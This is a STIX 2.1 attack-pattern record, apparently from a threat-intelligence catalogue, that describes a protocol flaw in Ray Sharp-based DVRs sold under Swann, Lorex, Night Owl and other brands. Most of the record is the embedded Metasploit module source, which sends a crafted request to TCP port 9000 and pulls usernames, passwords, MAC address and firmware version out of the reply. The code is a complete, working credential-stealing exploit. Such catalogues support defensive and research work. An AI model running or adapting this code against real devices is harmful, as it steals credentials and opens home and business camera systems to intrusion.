{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b6ec9d39-9f1b-475c-81ff-5f07fcfe1d95",
    "created": "2024-08-14T16:27:09.301577Z",
    "modified": "2024-08-14T16:27:09.301581Z",
    "name": "Ray Sharp DVR Password Retriever",
    "description": " This module takes advantage of a protocol design issue with the Ray Sharp based DVR systems. It is possible to retrieve the username and password through the TCP service running on port 9000. Other brands using this platform and exposing the same issue may include Swann, Lorex Night Owl, Zmodo, URMET, and KGuard Security. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/misc/raysharp_dvr_passwords.rb",
            "external_id": "raysharp_dvr_passwords.rb"
        },
        {
            "source_name": "reference",
            "url": "http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'        => 'Ray Sharp DVR Password Retriever',\n      'Description' => %q{\n          This module takes advantage of a protocol design issue with the\n        Ray Sharp based DVR systems. It is possible to retrieve the username and\n        password through the TCP service running on port 9000. Other brands using\n        this platform and exposing the same issue may include Swann, Lorex,\n        Night Owl, Zmodo, URMET, and KGuard Security.\n      },\n      'Author'      =>\n        [\n          'someluser', # Python script\n          'hdm'        # Metasploit module\n        ],\n      'References'  =>\n        [\n          [ 'URL', 'http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html' ]\n        ],\n      'License'     => MSF_LICENSE\n    )\n\n    register_options( [ Opt::RPORT(9000) ])\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def run_host(ip)\n    req =\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x0E\\x0F\" +\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x14\\x00\\x00\\x00\\x00\\x00\" +\n      ( \"\\x00\" * 475 )\n\n    connect\n    sock.put(req)\n\n    buf = \"\"\n    begin\n      # Pull data until the socket closes or we time out\n      Timeout.timeout(15) do\n        loop do\n          res = sock.get_once(-1, 1)\n          buf << res if res\n        end\n      end\n    rescue ::Timeout::Error\n    rescue ::EOFError\n    end\n\n    disconnect\n\n    info = \"\"\n    mac  = nil\n    ver  = nil\n\n    creds = {}\n\n    buf.scan(/[\\x00\\xff]([\\x20-\\x7f]{1,32})\\x00+([\\x20-\\x7f]{1,32})\\x00\\x00([\\x20-\\x7f]{1,32})\\x00/m).each do |cred|\n      # Make sure the two passwords match\n      next unless cred[1] == cred[2]\n      creds[cred[0]] = cred[1]\n    end\n\n    if creds.keys.length > 0\n      creds.keys.sort.each do |user|\n        pass = creds[user]\n        report_cred(\n          ip: rhost,\n          port: rport,\n          service_name: 'dvr',\n          user: user,\n          password: pass,\n          proof: pass\n        )\n        info << \"(user='#{user}' pass='#{pass}') \"\n      end\n    end\n\n    # Look for MAC address\n    if buf =~ /([0-9A-F]{2}\\-[0-9A-F]{2}\\-[0-9A-F]{2}\\-[0-9A-F]{2}\\-[0-9A-F]{2}\\-[0-9A-F]{2})/mi\n      mac = $1\n    end\n\n    # Look for version\n    if buf =~ /(V[0-9]+\\.[0-9][^\\x00]+)/m\n      ver = $1\n    end\n\n    info << \"mac=#{mac} \" if mac\n    info << \"version=#{ver} \" if ver\n\n    return unless (creds.keys.length > 0 or mac or ver)\n\n    report_service(:host => rhost, :port => rport, :sname => 'dvr', :info => info)\n    print_good(\"#{rhost}:#{rport} #{info}\")\n  end\nend\n"
}